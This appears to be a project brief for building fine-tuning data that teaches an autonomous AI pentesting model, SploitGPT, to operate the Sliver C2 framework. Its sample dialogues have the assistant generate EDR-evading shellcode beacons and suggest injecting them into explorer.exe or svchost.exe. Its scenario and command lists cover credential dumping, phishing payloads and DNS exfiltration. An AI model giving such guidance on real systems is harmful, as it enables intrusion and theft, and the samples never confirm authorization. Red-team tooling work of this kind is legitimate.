# SploitGPT Sliver LLM Training Pipeline

## Project Context

**SploitGPT** is an autonomous AI penetration testing framework that uses a fine-tuned Qwen2.5-7B model to operate security tools. The current model (`sploitgpt-7b-v5`) was trained on Metasploit operations. We need to extend it to support **Sliver C2** - a modern command-and-control framework.

**Repository:** https://github.com/richardnixon25/SploitGPT
**Current Model:** https://huggingface.co/cheeseman2422/sploitgpt-7b-v5-gguf

---

## Objective

Create a comprehensive training data pipeline and fine-tuning workflow to teach the SploitGPT model how to use Sliver C2 effectively. The model should be able to:

1. **Understand Sliver concepts** - sessions vs beacons, implant types, C2 channels
2. **Generate valid Sliver commands** - proper syntax for all operations
3. **Make tactical decisions** - when to use beacon vs session, which C2 channel, evasion techniques
4. **Chain operations** - combine reconnaissance, exploitation, and post-exploitation using Sliver
5. **Explain actions** - describe what it's doing and why (for user education)

---

## Directory Structure to Create

```
training/
├── sliver/
│   ├── README.md                    # Overview of Sliver training data
│   ├── raw/                         # Raw data sources
│   │   ├── docs/                    # Scraped Sliver documentation
│   │   ├── wiki/                    # Sliver wiki content
│   │   ├── armory/                  # Armory extension docs
│   │   └── examples/                # Real-world usage examples
│   │
│   ├── processed/                   # Cleaned and structured data
│   │   ├── commands/                # Command reference dataset
│   │   ├── scenarios/               # Attack scenario datasets
│   │   ├── conversations/           # Conversational training pairs
│   │   └── explanations/            # Educational explanations
│   │
│   ├── synthetic/                   # Generated training data
│   │   ├── command_variations/      # Augmented command examples
│   │   ├── error_handling/          # Error scenarios and recovery
│   │   └── tactical_decisions/      # Decision-making examples
│   │
│   ├── scripts/                     # Data processing scripts
│   │   ├── scrape_docs.py          # Scrape Sliver documentation
│   │   ├── parse_wiki.py           # Parse wiki into structured format
│   │   ├── generate_conversations.py # Generate conversational pairs
│   │   ├── augment_commands.py     # Create command variations
│   │   ├── validate_data.py        # Validate training data quality
│   │   └── export_dataset.py       # Export to training format
│   │
│   ├── templates/                   # Prompt templates
│   │   ├── system_prompts/         # System prompt variations
│   │   ├── user_prompts/           # User request templates
│   │   └── assistant_responses/    # Expected response formats
│   │
│   └── config/
│       ├── training_config.yaml    # Fine-tuning hyperparameters
│       └── data_config.yaml        # Data processing configuration
│
├── combined/                        # MSF + Sliver combined dataset
│   ├── merged_dataset.jsonl        # Final training dataset
│   └── merge_datasets.py           # Script to combine datasets
│
└── evaluation/
    ├── benchmarks/                  # Evaluation benchmarks
    │   ├── sliver_command_accuracy.jsonl
    │   ├── tactical_decision_making.jsonl
    │   └── explanation_quality.jsonl
    │
    └── scripts/
        ├── evaluate_model.py        # Run evaluations
        └── compare_versions.py      # Compare model versions
```

---

## Data Sources to Scrape/Process

### 1. Official Sliver Documentation
- **URL:** https://sliver.sh/docs
- **Content:** Installation, usage, implant generation, listeners, post-exploitation
- **Format:** Extract as structured markdown, then convert to Q&A pairs

### 2. Sliver GitHub Wiki
- **URL:** https://github.com/BishopFox/sliver/wiki
- **Content:** Detailed guides, architecture, extension development
- **Format:** Parse each wiki page into topic-specific datasets

### 3. Sliver Armory
- **URL:** https://github.com/sliverarmory/
- **Content:** Extensions like BOFs, .NET assemblies, third-party tools
- **Format:** Document each extension's purpose and usage

### 4. Sliver Source Code
- **URL:** https://github.com/BishopFox/sliver
- **Files:** `client/command/` directory contains all client commands
- **Format:** Extract command help text, flags, and examples

### 5. Community Resources
- Blog posts about Sliver usage (with proper attribution)
- Conference talks/presentations
- Red team operation reports (sanitized)

---

## Training Data Categories

### Category 1: Command Reference (40% of dataset)

Format each Sliver command as instruction-response pairs:

```json
{
  "instruction": "How do I start an mTLS listener on port 8888 in Sliver?",
  "input": "",
  "output": "To start an mTLS (mutual TLS) listener in Sliver:\n\n```\nmtls --lport 8888\n```\n\nThis creates a secure C2 channel using certificate-based authentication. The listener will:\n- Bind to all interfaces (0.0.0.0) by default\n- Use Sliver's auto-generated certificates\n- Support both session and beacon implants\n\nFor a specific interface: `mtls --lhost 10.0.0.1 --lport 8888`"
}
```

**Commands to document:**
- Listener management: `mtls`, `http`, `https`, `dns`, `wg`, `jobs`, `kill-job`
- Implant generation: `generate`, `regenerate`, `profiles`, `implants`
- Session/Beacon interaction: `use`, `sessions`, `beacons`, `kill`
- Post-exploitation: `execute`, `shell`, `upload`, `download`, `ps`, `netstat`, `ifconfig`
- Pivoting: `pivots`, `portfwd`, `socks5`
- Credential access: `hashdump`, `dcsync`, `kerberoast`
- Persistence: `persistence`, `service`
- Evasion: `cursed`, `stagers`
- Armory extensions: All BOFs and assemblies

### Category 2: Tactical Scenarios (30% of dataset)

Multi-turn conversations showing complete attack workflows:

```json
{
  "conversations": [
    {
      "role": "user",
      "content": "I have initial access to a Windows workstation. I want to establish persistent C2 and pivot to other machines on the network."
    },
    {
      "role": "assistant", 
      "content": "I'll help you establish persistent access and set up for lateral movement. Here's my recommended approach:\n\n**Step 1: Upgrade to Beacon**\nFirst, let's convert your session to a beacon for stealth:\n```\ngenerate beacon --os windows --arch amd64 --mtls 10.0.0.1:8888 --seconds 60 --jitter 30\n```\nThis creates an implant that checks in every 60 seconds with 30% jitter, making traffic patterns less predictable.\n\n**Step 2: Enumerate the Network**\nBefore pivoting, let's understand the environment:\n```\nnetstat\nifconfig\nps\n```\n\nShall I proceed with generating the beacon?"
    },
    {
      "role": "user",
      "content": "Yes, generate the beacon. The target has EDR so I need to be careful."
    },
    {
      "role": "assistant",
      "content": "Given the EDR presence, I'll use additional evasion techniques:\n\n```\ngenerate beacon --os windows --arch amd64 --mtls 10.0.0.1:8888 \\\n  --seconds 300 --jitter 50 \\\n  --evasion \\\n  --format shellcode \\\n  --name edr-bypass-beacon\n```\n\n**Evasion considerations:**\n- Extended 5-minute interval with 50% jitter to minimize behavioral detection\n- Shellcode format for in-memory execution (no file on disk)\n- The `--evasion` flag enables Sliver's built-in EDR evasion\n\n**Delivery method:** I recommend using a process hollowing or reflective injection technique. The shellcode can be injected into a legitimate process like `explorer.exe` or `svchost.exe`.\n\nWould you like me to also prepare a SOCKS5 pivot for network access?"
    }
  ]
}
```

**Scenarios to create:**
- Initial access → persistence → lateral movement
- Phishing campaign with Sliver payloads
- Living-off-the-land with Sliver BOFs
- Domain enumeration and privilege escalation
- Data exfiltration through DNS C2
- EDR evasion techniques
- Multi-stage payload delivery
- Pivoting through compromised hosts

### Category 3: Concept Explanations (15% of dataset)

Educational content explaining Sliver concepts:

```json
{
  "instruction": "Explain the difference between Sliver sessions and beacons. When should I use each?",
  "input": "",
  "output": "**Sessions vs Beacons in Sliver**\n\n**Sessions** are interactive, real-time connections:\n- Constant connection to the C2 server\n- Immediate command execution and response\n- Best for: Active exploitation, real-time interaction, debugging\n- Risk: Easier to detect due to persistent connection\n\n**Beacons** are asynchronous, periodic check-ins:\n- Connect at intervals (e.g., every 60 seconds)\n- Commands are queued and executed on next check-in\n- Best for: Long-term access, stealth operations, noisy networks\n- Advantage: Harder to detect, survives network interruptions\n\n**Decision Matrix:**\n| Situation | Recommendation |\n|-----------|----------------|\n| Initial exploitation | Session (for quick pivoting) |\n| Long-term persistence | Beacon |\n| EDR present | Beacon with high jitter |\n| Stable network | Either works |\n| Interactive tasks (shell) | Session |\n| Automated collection | Beacon with tasks |"
}
```

**Concepts to explain:**
- C2 channels (mTLS, HTTP/S, DNS, WireGuard)
- Implant architecture (sessions, beacons, stages)
- Operator model (multi-user collaboration)
- Armory and extensions
- Evasion techniques
- Traffic profiles and malleable C2
- Pivoting and tunneling
- OPSEC considerations

### Category 4: Error Handling (10% of dataset)

Training data for handling errors and edge cases:

```json
{
  "instruction": "I'm getting 'session not found' when trying to interact with session abc123",
  "input": "Error: Session abc123 not found",
  "output": "The session may have died or been killed. Let me help troubleshoot:\n\n**Check active sessions:**\n```\nsessions\n```\n\n**Possible causes:**\n1. **Session died** - The implant process was terminated on the target\n2. **Network issue** - Connection was interrupted\n3. **ID mismatch** - Session IDs are long; ensure you're using the correct one\n\n**If the session is gone:**\n- Check if you have other sessions: `sessions`\n- If you deployed a beacon, check: `beacons`\n- Regenerate the implant if needed: `regenerate --name <implant-name>`\n\n**Prevention:** Consider using beacons for persistence - they automatically reconnect and are more resilient to network issues."
}
```

**Error scenarios to cover:**
- Connection failures
- Session/beacon not found
- Implant generation errors
- Listener port conflicts
- Certificate issues
- Extension loading failures
- Timeout errors
- Permission denied scenarios

### Category 5: Tool Comparison (5% of dataset)

Comparing Sliver to other tools (educational):

```json
{
  "instruction": "What are the advantages of Sliver over Metasploit for C2?",
  "input": "",
  "output": "**Sliver vs Metasploit for C2 Operations**\n\n**Sliver Advantages:**\n- Modern implant architecture with sessions AND beacons\n- Native cross-platform Go implants (no Python/PowerShell dependencies)\n- Multiple C2 protocols: mTLS, HTTP/S, DNS, WireGuard\n- Built-in evasion features (process injection, ETW bypass)\n- Multiplayer mode for team operations\n- Extensible via Armory (BOFs, .NET assemblies)\n\n**Metasploit Advantages:**\n- Massive exploit database (2000+ exploits)\n- Well-documented, large community\n- Meterpreter has extensive post-exploitation capabilities\n- Better for exploitation phase\n\n**Recommendation:** Use both!\n- Metasploit for initial exploitation and vulnerability assessment\n- Sliver for C2, persistence, and long-term operations\n\nSploitGPT supports both frameworks and can help you leverage each tool's strengths."
}
```

---

## Data Generation Scripts

### Script 1: scrape_docs.py

```python
"""
Scrape Sliver documentation from sliver.sh and GitHub wiki.

Output: training/sliver/raw/docs/*.md
"""

import requests
from bs4 import BeautifulSoup
from pathlib import Path
import json
import time

SLIVER_DOCS_URL = "https://sliver.sh/docs"
WIKI_BASE = "https://github.com/BishopFox/sliver/wiki"

def scrape_sliver_docs():
    """Scrape official documentation."""
    # Implementation here
    pass

def scrape_wiki():
    """Scrape GitHub wiki pages."""
    # Implementation here
    pass

def extract_command_help():
    """Extract help text from Sliver source code."""
    # Parse client/command/*.go files for help strings
    pass
```

### Script 2: generate_conversations.py

```python
"""
Generate conversational training data from structured command reference.

Takes command documentation and creates realistic user-assistant dialogues.
"""

import json
from pathlib import Path
import random

# Templates for generating variations
USER_TEMPLATES = [
    "How do I {action} in Sliver?",
    "What's the command to {action}?",
    "I need to {action}. What should I do?",
    "Can you help me {action}?",
    "Show me how to {action}",
]

def generate_command_variations(command_data: dict) -> list[dict]:
    """Generate multiple training examples from one command."""
    # Implementation here
    pass

def create_tactical_scenario(scenario_template: dict) -> dict:
    """Generate multi-turn conversation from scenario template."""
    # Implementation here
    pass
```

### Script 3: validate_data.py

```python
"""
Validate training data quality and format.

Checks:
- JSON schema compliance
- No duplicate entries
- Balanced category distribution
- Response quality metrics
"""

import json
from pathlib import Path
from collections import Counter

def validate_jsonl(filepath: Path) -> dict:
    """Validate a JSONL training file."""
    issues = []
    stats = Counter()
    
    with open(filepath) as f:
        for i, line in enumerate(f):
            try:
                entry = json.loads(line)
                # Validate structure
                # Check for required fields
                # Verify response quality
            except json.JSONDecodeError as e:
                issues.append(f"Line {i}: Invalid JSON - {e}")
    
    return {"issues": issues, "stats": dict(stats)}
```

### Script 4: export_dataset.py

```python
"""
Export processed data to training formats.

Supports:
- Alpaca format (instruction/input/output)
- ShareGPT format (conversations)
- Raw JSONL for custom processing
"""

def export_alpaca_format(data: list, output_path: Path):
    """Export to Alpaca instruction format."""
    pass

def export_sharegpt_format(conversations: list, output_path: Path):
    """Export to ShareGPT conversation format."""
    pass

def merge_with_msf_dataset(sliver_data: Path, msf_data: Path, output: Path):
    """Merge Sliver data with existing MSF training data."""
    pass
```

---

## Fine-Tuning Configuration

### training_config.yaml

```yaml
# Fine-tuning configuration for Sliver extension

base_model: "Qwen/Qwen2.5-7B"
# Or continue from existing SploitGPT model:
# base_model: "cheeseman2422/sploitgpt-7b-v5"

training:
  method: "lora"  # or "qlora" for memory efficiency
  
  lora:
    r: 64
    lora_alpha: 128
    lora_dropout: 0.05
    target_modules:
      - "q_proj"
      - "k_proj"
      - "v_proj"
      - "o_proj"
      - "gate_proj"
      - "up_proj"
      - "down_proj"
  
  hyperparameters:
    learning_rate: 2e-5
    num_epochs: 3
    batch_size: 4
    gradient_accumulation_steps: 8
    warmup_ratio: 0.03
    weight_decay: 0.01
    max_seq_length: 4096
    
  optimizer: "adamw_torch"
  scheduler: "cosine"
  
dataset:
  train_file: "training/combined/merged_dataset.jsonl"
  eval_file: "training/evaluation/benchmarks/sliver_command_accuracy.jsonl"
  format: "alpaca"  # or "sharegpt"
  
output:
  dir: "models-adapters/sploitgpt-7b-v6-sliver"
  save_steps: 500
  eval_steps: 250
  
quantization:
  # For GGUF export
  methods:
    - "q4_k_m"
    - "q5_k_m"
    - "q8_0"
```

---

## Quality Criteria for Training Data

### Must Have:
1. **Accuracy** - All Sliver commands must be valid and work as described
2. **Completeness** - Cover all major Sliver functionality
3. **Context** - Explain WHY, not just WHAT
4. **Safety** - Include appropriate warnings for dangerous operations
5. **Consistency** - Uniform formatting and style

### Validation Checks:
- [ ] Command syntax matches Sliver v1.6.x
- [ ] No deprecated commands or flags
- [ ] Proper escaping in command examples
- [ ] Balanced representation across categories
- [ ] No sensitive/real-world target information
- [ ] Explanations are technically accurate

### Minimum Dataset Size Targets:
- Command reference: 500+ examples
- Tactical scenarios: 100+ multi-turn conversations
- Concept explanations: 200+ entries
- Error handling: 100+ examples
- **Total: 1000+ high-quality training examples**

---

## Integration with SploitGPT

After fine-tuning, the model will be integrated via these tools:

```python
# sploitgpt/agent/tools/sliver_tools.py (to be created)

SLIVER_TOOLS = [
    {
        "name": "sliver_list_sessions",
        "description": "List all active Sliver sessions",
        "parameters": {}
    },
    {
        "name": "sliver_list_beacons", 
        "description": "List all active Sliver beacons",
        "parameters": {}
    },
    {
        "name": "sliver_interact",
        "description": "Interact with a session or beacon",
        "parameters": {
            "target_id": "string - Session or beacon ID",
            "command": "string - Command to execute"
        }
    },
    {
        "name": "sliver_generate_implant",
        "description": "Generate a new Sliver implant",
        "parameters": {
            "os": "string - Target OS (windows/linux/darwin)",
            "arch": "string - Architecture (amd64/386/arm64)",
            "c2_url": "string - C2 callback URL",
            "is_beacon": "boolean - Generate beacon vs session",
            "evasion": "boolean - Enable evasion features"
        }
    },
    {
        "name": "sliver_start_listener",
        "description": "Start a C2 listener",
        "parameters": {
            "protocol": "string - mtls/http/https/dns",
            "host": "string - Bind address",
            "port": "integer - Listen port"
        }
    }
]
```

---

## Deliverables Checklist

### Phase 1: Data Collection
- [ ] Scrape Sliver documentation (sliver.sh)
- [ ] Scrape GitHub wiki
- [ ] Extract command help from source code
- [ ] Document Armory extensions
- [ ] Collect community examples (with attribution)

### Phase 2: Data Processing
- [ ] Clean and structure raw data
- [ ] Create command reference dataset
- [ ] Generate tactical scenario conversations
- [ ] Write concept explanations
- [ ] Create error handling examples

### Phase 3: Data Augmentation
- [ ] Generate command variations
- [ ] Create synthetic scenarios
- [ ] Balance dataset categories
- [ ] Validate all entries

### Phase 4: Training Pipeline
- [ ] Set up training environment
- [ ] Configure LoRA parameters
- [ ] Run training
- [ ] Evaluate on benchmarks
- [ ] Export to GGUF format

### Phase 5: Integration Testing
- [ ] Test with SploitGPT agent
- [ ] Verify tool calling accuracy
- [ ] Check explanation quality
- [ ] User acceptance testing

---

## Notes for Copilot

1. **Start with data collection** - The quality of training data is more important than quantity
2. **Use existing MSF data as reference** - Check `training/msf/` for format examples
3. **Test commands against real Sliver** - Don't guess; verify all command syntax
4. **Include the "why"** - SploitGPT is educational; explanations matter
5. **Version compatibility** - Target Sliver v1.6.x (latest stable)
6. **Coordinate with integration work** - The tools in `sploitgpt/sliver/` define what the model needs to call

---

## Resources

- Sliver Documentation: https://sliver.sh/docs
- Sliver GitHub: https://github.com/BishopFox/sliver
- Sliver Wiki: https://github.com/BishopFox/sliver/wiki
- Sliver Armory: https://github.com/sliverarmory
- sliver-py (Python client): https://github.com/moloch--/sliver-py
- Existing SploitGPT training: `training/` directory in repo
- Fine-tuning guide: https://huggingface.co/docs/transformers/training
